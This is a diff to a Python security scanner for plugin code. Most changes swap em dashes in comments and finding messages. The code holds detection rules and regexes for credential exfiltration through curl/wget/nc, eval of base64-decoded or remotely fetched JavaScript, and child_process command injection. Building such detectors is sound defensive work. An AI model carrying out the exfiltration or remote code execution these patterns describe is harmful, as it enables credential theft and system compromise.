         # once, at `i`.
         if any(k in loop_direct_lines for k in range(i, line_end + 1)):
@@ -17493,7 +17493,7 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
                 "crit",
                 i,
                 "reads a credential file and sends it to an outbound command "
-                "(curl/wget/nc) — credential exfiltration",
+                "(curl/wget/nc) \u2014 credential exfiltration",
             )
         if any(k in cred_var_lines for k in range(i, line_end + 1)) or any(
             k in loop_hop_lines for k in range(i, line_end + 1)
@@ -17503,21 +17503,21 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
                 "crit",
                 i,
                 "a credential-file value flows into an outbound command "
-                "(curl/wget/nc) — credential exfiltration",
+                "(curl/wget/nc) \u2014 credential exfiltration",
             )
     return out
 
 
 # --------------------------------------------------------------------------- #
-# analyze_javascript (F-064): lexical JS/TS pass — the JS blind spot.          #
+# analyze_javascript (F-064): lexical JS/TS pass - the JS blind spot.          #
 # Hybrid severity: eval/Function of a decoded blob and remote fetch-then-exec  #
 # are crit (obfuscated RCE, zero-FP); every other rule is warn (often legit).  #
-# B-743: the warn set is NOT enumerated here — it was, as two, and went stale   #
+# B-743: the warn set is NOT enumerated here - it was, as two, and went stale   #
 # when a third arrived, which is how the consuming bucket's advice went false.  #
 # The list lives in the function docstring below and in checks/_vet.py's        #
 # _JS_WARN_REMEDIATION, which a test keeps complete. No JS parser; stdlib re.   #
 # --------------------------------------------------------------------------- #
-# eval / new Function of a base64-decoded blob — obfuscated code execution.
+# eval / new Function of a base64-decoded blob - obfuscated code execution.
 _JS_EVAL_DECODED_RE = re.compile(
     r"\b(?:eval|(?:new\s+)?Function)\s*\(\s*"
     r"(?:atob\s*\(|Buffer\.from\s*\([^)\n]*['\"]base64['\"])",
@@ -17531,14 +17531,14 @@ _JS_EVAL_REMOTE_RE = re.compile(
     r"|\beval\s*\(\s*await\b[^;\n]*\bfetch\s*\(",
     re.I,
 )
-# child_process exec-family with an interpolated command — command-injection surface.
+# child_process exec-family with an interpolated command - command-injection surface.
 # Three receiver shapes, captured so the caller can tell `child_process.exec(` apart
 # from an unrelated method of the same name on some other object (a DB client's own
-# `.exec()`, a compiled RegExp's `.exec()`, ...) — see _js_child_process_bindings:
-#   group 1 — a simple identifier receiver, e.g. `cp.exec(` (needs a resolved binding)
-#   group 2 — an inline `require('child_process').exec(` chain (unambiguous, no
+# `.exec()`, a compiled RegExp's `.exec()`, ...) - see _js_child_process_bindings:
+#   group 1 - a simple identifier receiver, e.g. `cp.exec(` (needs a resolved binding)
+#   group 2 - an inline `require('child_process').exec(` chain (unambiguous, no
 #             binding needed: the module name is right there in the same expression)
-#   group 3 — the exec-family function name actually called
+#   group 3 - the exec-family function name actually called
 _JS_CP_TEMPLATE_RE = re.compile(
     r"\b(?:([A-Za-z_$][\w$]*)\."
     r"|(require\(\s*['\"](?:node:)?child_process['\"]\s*\)\s*\.))?"
@@ -17563,7 +17563,7 @@ def _js_child_process_bindings(masked: str) -> "tuple[set, set]":
     e.g. `cp` in `cp.exec(...)`) or to one of its exec-family functions destructured
     directly (`names`, e.g. `exec` in `const {exec} = require('child_process')`).
 
-    `child_process` itself is always a valid receiver — it is the module's own,
+    `child_process` itself is always a valid receiver - it is the module's own,
     unambiguous canonical name, usable inline (`require('child_process').exec(...)`)
     with no assignment for this lexical pass to see. Every other receiver or bare name
     must be traced to an actual binding: this is what stops `this.db.exec(...)` (a
@@ -17582,7 +17582,7 @@ def _js_child_process_bindings(masked: str) -> "tuple[set, set]":
         if not group:
             continue
         for entry in group.split(","):
-            # `exec` or `exec: myExec` (rename) or `exec as myExec` (ESM rename) —
+            # `exec` or `exec: myExec` (rename) or `exec as myExec` (ESM rename) -
             # the LOCAL bound name is what a call site actually uses, so take the
             # part after the alias operator when one is present, else the whole entry.
             entry = entry.strip()
@@ -17592,11 +17592,11 @@ def _js_child_process_bindings(masked: str) -> "tuple[set, set]":
             if local:
                 names.add(local)
     return receivers, names
-# require() of a non-literal (bareword identifier or template) — dynamic module load.
+# require() of a non-literal (bareword identifier or template) - dynamic module load.
 _JS_DYN_REQUIRE_RE = re.compile(
     r"\brequire\s*\(\s*(?:`[^`]*\$\{|[A-Za-z_$][\w$.]*\s*[)+])",
 )
-# process.dlopen() — a direct native-addon (.node) load: the native-boundary escape.
+# process.dlopen() - a direct native-addon (.node) load: the native-boundary escape.
 # Node's own docs (process.dlopen) say require() should be preferred and it "should not
 # be used directly"; direct use in plugin runtime JS is a red flag. warn-only.
 _JS_NATIVE_DLOPEN_RE = re.compile(
@@ -17663,24 +17663,24 @@ def analyze_javascript(source: str, filename: str = "<skill>") -> list[ASTFindin
     """Conservative lexical pass over a bundled .js/.ts/.mjs/.cjs file (F-064). No JS
     AST; stdlib regex only; never raises, never executes. Hybrid severity:
 
-      JS_EVAL_DECODED (crit) — eval / new Function over a base64-decoded blob
+      JS_EVAL_DECODED (crit) - eval / new Function over a base64-decoded blob
         (an eval of an atob result, or a Function built from a base64 Buffer): obfuscated RCE.
-      JS_EVAL_REMOTE (crit) — remote code fetched then executed: a dynamic import of a
+      JS_EVAL_REMOTE (crit) - remote code fetched then executed: a dynamic import of a
         URL, a then-eval chained on a fetch, or an eval over an awaited fetch.
-      JS_CHILD_PROCESS_DYNAMIC (warn) — a child_process exec-family call with an
+      JS_CHILD_PROCESS_DYNAMIC (warn) - a child_process exec-family call with an
         interpolated command: command-injection surface. The matched call's own receiver
         (or, for a bare call, its destructured origin) must actually resolve to
-        child_process — kills both the RegExp.exec FP and an unrelated method of the
+        child_process - kills both the RegExp.exec FP and an unrelated method of the
         same name on some other object (e.g. a DB client's own `.exec()`) merely
         because the file imports child_process for something else (B-806).
-      JS_DYNAMIC_REQUIRE (warn) — require() of a non-literal (variable / template):
+      JS_DYNAMIC_REQUIRE (warn) - require() of a non-literal (variable / template):
         an attacker-influenced module path.
-      JS_NATIVE_DLOPEN (warn) — process.dlopen(): a direct native-addon (.node) load,
+      JS_NATIVE_DLOPEN (warn) - process.dlopen(): a direct native-addon (.node) load,
         the native-boundary escape that bypasses JS-level analysis. Node's docs say
         require() should be preferred over calling dlopen directly.
 
-    Benign JS — static eval, JSON.parse(atob(token)), local require, base64 decode
-    without eval — stays silent. Comments are masked so documented examples don't fire."""
+    Benign JS - static eval, JSON.parse(atob(token)), local require, base64 decode
+    without eval - stays silent. Comments are masked so documented examples don't fire."""
     out: list[ASTFinding] = []
     seen: set = set()
 
@@ -17697,7 +17697,7 @@ def analyze_javascript(source: str, filename: str = "<skill>") -> list[ASTFindin
             "JS_EVAL_DECODED",
             "crit",
             ln,
-            "eval/Function over a base64-decoded blob — "
+            "eval/Function over a base64-decoded blob \u2014 "
             "obfuscated remote code execution",
         )
 
@@ -17708,7 +17708,7 @@ def analyze_javascript(source: str, filename: str = "<skill>") -> list[ASTFindin
             "crit",
             ln,
             "remote code is fetched and executed (a URL import, or a fetched "
-            "blob passed straight to eval) — remote code execution",
+            "blob passed straight to eval) \u2014 remote code execution",
         )
 
     if "child_process" in masked:
@@ -17716,7 +17716,7 @@ def analyze_javascript(source: str, filename: str = "<skill>") -> list[ASTFindin
         for m in _JS_CP_TEMPLATE_RE.finditer(masked):
             receiver, inline_require, fn_name = m.group(1), m.group(2), m.group(3)
             if inline_require is not None:
-                pass  # require('child_process').exec(...) — unambiguous, no binding needed
+                pass  # require('child_process').exec(...) - unambiguous, no binding needed
             elif receiver is not None:
                 if receiver not in cp_receivers:
                     continue
@@ -17728,7 +17728,7 @@ def analyze_javascript(source: str, filename: str = "<skill>") -> list[ASTFindin
                 "warn",
                 ln,
                 f"child_process {fn_name}() called with an interpolated "
-                "command — command-injection surface",
+                "command \u2014 command-injection surface",
             )
 
     for m in _JS_DYN_REQUIRE_RE.finditer(masked):
@@ -17737,7 +17737,7 @@ def analyze_javascript(source: str, filename: str = "<skill>") -> list[ASTFindin
             "JS_DYNAMIC_REQUIRE",
             "warn",
             ln,
-            "require() of a non-literal (variable/template) — a dynamic, "
+            "require() of a non-literal (variable/template) \u2014 a dynamic, "
             "possibly attacker-influenced module path",
         )
 
@@ -17747,7 +17747,7 @@ def analyze_javascript(source: str, filename: str = "<skill>") -> list[ASTFindin
             "JS_NATIVE_DLOPEN",
             "warn",
             ln,
-            "process.dlopen() loads a native addon (.node) directly — a "
+            "process.dlopen() loads a native addon (.node) directly \u2014 a "
             "native-boundary escape that bypasses JS-level analysis; require() "
             "is the normal loader",
         )
@@ -17758,12 +17758,12 @@ def analyze_javascript(source: str, filename: str = "<skill>") -> list[ASTFindin
 def simulate_effects(source: str, filename: str = "<skill>") -> list[dict]:
     """Analyze Python source to simulate reachable effects and guarding conditions under seeds.
 
-    Never raises, returns an empty list on failure — EXCEPT ScanBudgetExceeded
+    Never raises, returns an empty list on failure - EXCEPT ScanBudgetExceeded
     (C-175), which must propagate: the caller (checks/_vet.py's
     check_installed_skills) relies on it reaching run_all's dedicated handler,
     which converts a budget hit into an honest UNKNOWN finding. Swallowing it
     here made a truncated, incomplete simulation indistinguishable from "found
-    nothing" — a scan cut short mid-analysis silently reported PASS.
+    nothing" - a scan cut short mid-analysis silently reported PASS.
     """
     try:
         return EffectSimulator(source, filename).simulate()
